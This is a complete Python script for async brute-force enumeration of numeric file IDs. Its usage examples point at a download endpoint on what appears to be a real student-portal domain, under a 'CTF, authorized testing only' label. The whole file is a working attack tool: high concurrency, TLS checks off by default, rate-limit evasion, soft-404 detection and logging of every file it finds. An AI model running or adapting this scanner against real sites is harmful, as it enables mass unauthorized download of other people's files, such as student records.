#!/usr/bin/env python3
"""
scanner.py — Async numeric ID enumerator for CTF file discovery.
Brute-forces integer IDs on endpoints like:
    https://student.qualityobe.com/site/downloadactivityfile?id=1176403

AUTHORIZED TESTING ONLY.

Usage:
    python scanner.py -u "https://student.qualityobe.com/site/downloadactivityfile" --start 1170000 --end 1185000 -c 30 -o results
"""

import asyncio
import aiohttp
import argparse
import json
import hashlib
import time
import sys
from dataclasses import dataclass, asdict
from typing import Optional
from datetime import datetime


# ──────────────────────────────────────────────────────────────────────────────
# Data structure for one result
# ──────────────────────────────────────────────────────────────────────────────

@dataclass
class HitResult:
    id: int
    url: str
    status: int
    size: int
    content_type: str
    content_disposition: str
    redirect_location: str
    classification: str
    response_time_ms: float
    body_preview: str
    error: str = ""


# ──────────────────────────────────────────────────────────────────────────────
# Baseline fingerprint — detects soft-404 / custom error pages
# ──────────────────────────────────────────────────────────────────────────────

@dataclass
class Baseline:
    status: int = 0
    size: int = 0
    body_hash: str = ""
    size_tolerance: float = 0.05

    def is_404_like(self, status: int, size: int, body_hash: str) -> bool:
        if self.body_hash and body_hash == self.body_hash:
            return True
        if self.status == status and self.size > 0:
            diff = abs(size - self.size) / max(self.size, 1)
            if diff <= self.size_tolerance:
                return True
        return False


# ──────────────────────────────────────────────────────────────────────────────
# Main scanner
# ──────────────────────────────────────────────────────────────────────────────

class IDScanner:

    def __init__(
        self,
        base_url: str,
        param: str = "id",
        start: int = 1,
        end: int = 2_000_000,
        concurrency: int = 50,
        output_prefix: str = "results",
        timeout: float = 10.0,
        double_verify: bool = True,
        retry_limit: int = 2,
        delay_on_429: float = 5.0,
        user_agent: str = "Mozilla/5.0 (CTF-Scanner/1.0)",
        verify_ssl: bool = False,
        batch_print: int = 500,
    ):
        self.base_url = base_url.rstrip("/")
        self.param = param
        self.start = start
        self.end = end
        self.concurrency = concurrency
        self.output_prefix = output_prefix
        self.timeout = aiohttp.ClientTimeout(total=timeout)
        self.double_verify = double_verify
        self.retry_limit = retry_limit
        self.delay_on_429 = delay_on_429
        self.user_agent = user_agent
        self.verify_ssl = verify_ssl
        self.batch_print = batch_print

        self.baseline = Baseline()
        self.semaphore: asyncio.Semaphore = None
        self.hits: list = []
        self.checked = 0
        self.found = 0
        self.errors = 0
        self.total = end - start + 1
        self._stop = False
        self._progress_lock = asyncio.Lock()

    def build_url(self, id_val: int) -> str:
        return f"{self.base_url}?{self.param}={id_val}"

    async def _fetch(self, session: aiohttp.ClientSession, url: str):
        start = time.monotonic()
        try:
            async with session.get(url, allow_redirects=False, ssl=self.verify_ssl) as resp:
                elapsed_ms = (time.monotonic() - start) * 1000
                body = await resp.read()
                try:
                    preview = body[:200].decode("utf-8", errors="replace").strip()
                except Exception:
                    preview = repr(body[:80])
                return (
                    resp.status,
                    len(body),
                    resp.headers.get("Content-Type", ""),
                    resp.headers.get("Content-Disposition", ""),
                    resp.headers.get("Location", ""),
                    hashlib.md5(body).hexdigest(),
                    preview[:120],
                    round(elapsed_ms, 1),
                )
        except asyncio.TimeoutError:
            elapsed_ms = (time.monotonic() - start) * 1000
            return 0, 0, "", "", "", "", "TIMEOUT", round(elapsed_ms, 1)
        except aiohttp.ClientError as exc:
            elapsed_ms = (time.monotonic() - start) * 1000
            return 0, 0, "", "", "", "", str(exc)[:80], round(elapsed_ms, 1)

    async def _fetch_with_retry(self, session: aiohttp.ClientSession, url: str):
        for attempt in range(self.retry_limit + 1):
            result = await self._fetch(session, url)
            status = result[0]
            if status == 429:
                wait = self.delay_on_429 * (attempt + 1)
                print(f"\n  [Rate limited] Waiting {wait:.0f}s...", flush=True)
                await asyncio.sleep(wait)
                continue
            if status == 0 and attempt < self.retry_limit:
                await asyncio.sleep(0.3 * (attempt + 1))
                continue
            return result
        return 0, 0, "", "", "", "", "ALL_RETRIES_FAILED", 0.0

    async def establish_baseline(self, session: aiohttp.ClientSession) -> None:
        print("[*] Probing baseline (what does 'not found' look like?)...")

        probe_ids = [0, -1, 999_999_997, 999_999_998, 999_999_999]
        probe_statuses = []
        probe_sizes = []
        probe_hashes = []

        for pid in probe_ids:
            url = self.build_url(pid)
            status, size, ct, cd, loc, body_hash, preview, _ = await self._fetch(session, url)
            probe_statuses.append(status)
            probe_sizes.append(size)
            probe_hashes.append(body_hash)
            await asyncio.sleep(0.15)

        dominant_status = max(set(probe_statuses), key=probe_statuses.count)
        avg_size = int(sum(probe_sizes) / len(probe_sizes))
        unique_hashes = set(probe_hashes)
        best_hash = probe_hashes[0] if len(unique_hashes) == 1 else ""

        self.baseline = Baseline(
            status=dominant_status,
            size=avg_size,
            body_hash=best_hash,
        )

        print(
            f"[+] Baseline -> status={dominant_status}  "
            f"size~{avg_size}B  "
            f"hash={'fixed' if best_hash else 'varies (using size tolerance)'}"
        )

    def classify(self, status, size, body_hash, content_type, content_disposition) -> str:
        if status == 0:
            return "error"
        if self.baseline.is_404_like(status, size, body_hash):
            return "soft_404"
        if status == 200:
            if content_disposition and "attachment" in content_disposition.lower():
                return "hit"
            if size > 0:
                return "hit"
            return "soft_404"
        if status in (301, 302, 307, 308):
            return "redirect"
        if status == 403:
            return "forbidden"
        if status == 404:
            return "not_found"
        if status == 429:
            return "rate_limited"
        if 500 <= status < 600:
            return "server_error"
        return "other"

    async def check_id(self, session: aiohttp.ClientSession, id_val: int) -> Optional[HitResult]:
        async with self.semaphore:
            if self._stop:
                return None

            url = self.build_url(id_val)
            (status, size, content_type, content_disp,
             redirect_loc, body_hash, preview, elapsed) = await self._fetch_with_retry(session, url)

            classification = self.classify(status, size, body_hash, content_type, content_disp)

            keep_classes = {"hit", "redirect", "server_error", "rate_limited", "other", "error"}
            if classification not in keep_classes:
                return None

            if self.double_verify and classification in ("hit", "forbidden", "redirect"):
                await asyncio.sleep(0.1)
                (s2, sz2, ct2, cd2, rl2, bh2, pv2, el2) = await self._fetch_with_retry(session, url)
                clf2 = self.classify(s2, sz2, bh2, ct2, cd2)
                if clf2 != classification:
                    classification = "other"
                    preview = f"[VERIFY MISMATCH: {classification} vs {clf2}] " + preview

            return HitResult(
                id=id_val,
                url=url,
                status=status,
                size=size,
                content_type=content_type.split(";")[0].strip(),
                content_disposition=content_disp,
                redirect_location=redirect_loc,
                classification=classification,
                response_time_ms=elapsed,
                body_preview=preview,
                error="" if status != 0 else preview,
            )

    async def worker(self, session: aiohttp.ClientSession, queue: asyncio.Queue) -> None:
        while not self._stop:
            try:
                id_val = queue.get_nowait()
            except asyncio.QueueEmpty:
                break

            result = await self.check_id(session, id_val)

            async with self._progress_lock:
                self.checked += 1
                if result:
                    if result.classification == "hit":
                        self.found += 1
                        self.hits.append(result)
                        self._print_hit(result)
                    elif result.classification == "error":
                        self.errors += 1

                if self.checked % self.batch_print == 0 or self.checked == self.total:
                    self._print_progress()

            queue.task_done()

    def _print_progress(self) -> None:
        pct = (self.checked / self.total * 100) if self.total > 0 else 0
        line = (
            f"\r[~] Checked: {self.checked:>8,}/{self.total:,} "
            f"({pct:5.1f}%) | "
            f"Found: {self.found} | "
            f"Errors: {self.errors}   "
        )
        sys.stdout.write(line)
        sys.stdout.flush()

    def _print_hit(self, r: HitResult) -> None:
        print(f"\n  [FOUND]  id={r.id}  ->  {r.url}", flush=True)

    async def run(self) -> None:
        print(f"[*] ID range: {self.start:,} -> {self.end:,}  ({self.total:,} IDs)")
        print(f"[*] Endpoint: {self.base_url}?{self.param}=<id>\n")

        # Windows-compatible: no signal handler, Ctrl+C caught in main()
        self.semaphore = asyncio.Semaphore(self.concurrency)

        connector = aiohttp.TCPConnector(
            limit=self.concurrency + 10,
            ttl_dns_cache=300,
            force_close=False,
        )
        headers = {"User-Agent": self.user_agent}

        async with aiohttp.ClientSession(
            connector=connector,
            timeout=self.timeout,
            headers=headers,
        ) as session:

            await self.establish_baseline(session)

            queue: asyncio.Queue = asyncio.Queue()
            for id_val in range(self.start, self.end + 1):
                await queue.put(id_val)

            print(f"\n[*] Launching {self.concurrency} concurrent workers...\n")
            scan_start = time.monotonic()

            num_workers = min(self.concurrency, self.total)
            workers = [
                asyncio.create_task(self.worker(session, queue))
                for _ in range(num_workers)
            ]

            await asyncio.gather(*workers, return_exceptions=True)

        elapsed = time.monotonic() - scan_start
        rps = self.checked / elapsed if elapsed > 0 else 0

        print(f"\n\n{'='*60}")
        print(f"[DONE] Scan complete in {elapsed:.1f}s  ({rps:.0f} req/s)")
        print(f"    Checked : {self.checked:,}")
        print(f"    Found   : {self.found}")
        print(f"    Errors  : {self.errors}")
        print(f"{'='*60}\n")

        self.save_results()

    def save_results(self) -> None:
        txt_path  = f"{self.output_prefix}.txt"
        json_path = f"{self.output_prefix}.json"

        priority = {"hit": 0, "forbidden": 1, "redirect": 2, "server_error": 3, "other": 4, "error": 5}
        sorted_hits = sorted(self.hits, key=lambda r: (priority.get(r.classification, 9), r.id))

        with open(txt_path, "w", encoding="utf-8") as f:
            f.write("=" * 60 + "\n")
            f.write("  ID Enumeration Scan Results\n")
            f.write("=" * 60 + "\n")
            f.write(f"  Target  : {self.base_url}?{self.param}=<id>\n")
            f.write(f"  Range   : {self.start} -> {self.end}\n")
            f.write(f"  Scanned : {datetime.now().isoformat()}\n")
            f.write(f"  Checked : {self.checked:,}\n")
            f.write(f"  Found   : {self.found}\n")
            f.write("=" * 60 + "\n\n")

            if not sorted_hits:
                f.write("No interesting results found.\n")
            else:
                for r in sorted_hits:
                    icons = {"hit": "[REAL FILE]", "forbidden": "[FORBIDDEN]", "redirect": "[REDIRECT]", "other": "[UNCERTAIN]", "error": "[ERROR]"}
                    label = icons.get(r.classification, r.classification.upper())
                    f.write(f"{label}\n")
                    f.write(f"  ID                 : {r.id}\n")
                    f.write(f"  URL                : {r.url}\n")
                    f.write(f"  Status             : {r.status}\n")
                    f.write(f"  Size               : {r.size:,} bytes\n")
                    f.write(f"  Content-Type       : {r.content_type}\n")
                    if r.content_disposition:
                        f.write(f"  Content-Disposition: {r.content_disposition}\n")
                    if r.redirect_location:
                        f.write(f"  Redirect           : {r.redirect_location}\n")
                    f.write(f"  Response time      : {r.response_time_ms} ms\n")
                    if r.body_preview:
                        f.write(f"  Body preview       : {r.body_preview}\n")
                    if r.error:
                        f.write(f"  Error              : {r.error}\n")
                    f.write("\n")

        with open(json_path, "w", encoding="utf-8") as f:
            json.dump(
                {
                    "meta": {
                        "target": self.base_url,
                        "param": self.param,
                        "range_start": self.start,
                        "range_end": self.end,
                        "checked": self.checked,
                        "found": self.found,
                        "errors": self.errors,
                        "scanned_at": datetime.now().isoformat(),
                    },
                    "results": [asdict(r) for r in sorted_hits],
                },
                f,
                indent=2,
            )

        print(f"[+] Saved -> {txt_path}")
        print(f"[+] Saved -> {json_path}")

        if sorted_hits:
            print("\n--- Interesting Findings " + "-" * 40)
            for r in sorted_hits:
                redir = f"-> {r.redirect_location}" if r.redirect_location else ""
                print(f"  id={r.id:<12} [{r.status}]  {r.size:>8,}B  {r.content_type:<30} {r.classification}  {redir}")
            print("-" * 65)


# ──────────────────────────────────────────────────────────────────────────────
# CLI
# ──────────────────────────────────────────────────────────────────────────────

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Async numeric ID brute-forcer for CTF file discovery",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python scanner.py -u "https://student.qualityobe.com/site/downloadactivityfile" --start 1170000 --end 1185000 -c 30
  python scanner.py -u "https://student.qualityobe.com/site/downloadactivityfile" --start 1 --end 2000000 -c 50
        """,
    )
    parser.add_argument("-u", "--url", required=True, help="Base endpoint URL")
    parser.add_argument("--param", default="id", help="Query parameter name (default: id)")
    parser.add_argument("--start", type=int, default=1, help="First ID to try (default: 1)")
    parser.add_argument("--end", type=int, default=2_000_000, help="Last ID to try (default: 2000000)")
    parser.add_argument("-c", "--concurrency", type=int, default=50, help="Concurrent requests (default: 50)")
    parser.add_argument("-o", "--output", default="results", help="Output filename prefix (default: results)")
    parser.add_argument("-t", "--timeout", type=float, default=10.0, help="Request timeout in seconds (default: 10)")
    parser.add_argument("--no-verify", action="store_true", help="Skip double-verification on hits")
    parser.add_argument("--ssl", action="store_true", help="Enable SSL certificate verification")
    parser.add_argument("--delay-429", type=float, default=5.0, help="Seconds to wait when rate-limited (default: 5)")
    parser.add_argument("--retries", type=int, default=2, help="Retry attempts on connection error (default: 2)")
    parser.add_argument("--progress-every", type=int, default=500, help="Print progress every N requests (default: 500)")
    return parser.parse_args()


def main() -> None:
    args = parse_args()

    if args.start > args.end:
        print("[!] --start must be less than or equal to --end")
        sys.exit(1)

    total = args.end - args.start + 1
    eta_s = total / max(args.concurrency * 2, 1)

    print("=" * 60)
    print("  Numeric ID Enumerator — CTF Edition")
    print("  Authorized testing only")
    print("=" * 60)
    print(f"  Endpoint    : {args.url}?{args.param}=<id>")
    print(f"  Range       : {args.start:,} -> {args.end:,}  ({total:,} IDs)")
    print(f"  Concurrency : {args.concurrency}")
    print(f"  Timeout     : {args.timeout}s")
    print(f"  Verify hits : {'yes' if not args.no_verify else 'no'}")
    print(f"  Output      : {args.output}.{{txt,json}}")
    print(f"  Rough ETA   : ~{eta_s/60:.0f} min (varies by server speed)")
    print("=" * 60 + "\n")

    scanner = IDScanner(
        base_url=args.url,
        param=args.param,
        start=args.start,
        end=args.end,
        concurrency=args.concurrency,
        output_prefix=args.output,
        timeout=args.timeout,
        double_verify=not args.no_verify,
        delay_on_429=args.delay_429,
        retry_limit=args.retries,
        verify_ssl=args.ssl,
        batch_print=args.progress_every,
    )

    # Windows-compatible Ctrl+C handling (no signal module needed)
    try:
        asyncio.run(scanner.run())
    except KeyboardInterrupt:
        print("\n\n[!] Ctrl+C — saving partial results...")
        scanner.save_results()
        sys.exit(0)


if __name__ == "__main__":
    main()